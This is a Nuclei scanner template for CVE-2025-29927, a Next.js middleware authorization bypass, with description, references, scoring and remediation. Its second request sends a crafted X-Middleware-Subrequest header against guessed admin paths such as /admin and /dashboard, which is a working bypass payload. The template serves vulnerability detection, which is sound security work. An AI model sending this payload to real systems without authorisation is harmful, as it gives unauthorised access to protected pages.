id: CVE-2025-29927

info:
  name: Next.js Middleware Bypass Detection
  author: nvsecurity
  severity: critical
  description: |
    Next.js contains a critical vulnerability affecting versions 11.1.4 through 15.2.2.
    The vulnerability allows attackers to bypass middleware security controls by sending a specially crafted
    'x-middleware-subrequest' header, which can lead to authorization bypass and other security control circumvention.
    
    This template uses directory bruteforcing to discover protected endpoints that might be vulnerable
    to this attack. It implements a two-stage approach that first identifies middleware usage
    and then attempts exploitation.
  reference:
    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
    - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
    - https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927/
  remediation: |
    Upgrade to Next.js 14.2.25 or 15.2.3 or later.
    If upgrading is not possible, block the x-middleware-subrequest header at the WAF or server level.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-287
  metadata:
    max-request: 2
    shodan-query: x-middleware-rewrite
    fofa-query: x-middleware-rewrite
    product: next.js
    vendor: zeit
  tags: cve,cve2025,nextjs,middleware,auth-bypass


flow: |
    const paths = [
      "",
      "admin",
      "dashboard",
      "administrator",
      "account",
      "users"
    ]
    for (let path of iterate(paths)) {
      set("path", path);
      http(1) && http(2);
    }

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}"
    headers:
      X-Nextjs-Data: 1

    matchers:
      - type: dsl
        dsl:
          - contains_any(to_lower(header), 'x-nextjs-redirect', 'x-middleware-rewrite', 'x-nextjs-rewrite', 'x-middleware-next') && status_code == 307
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}/{{path}}"
    headers:
      X-Middleware-Subrequest: "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
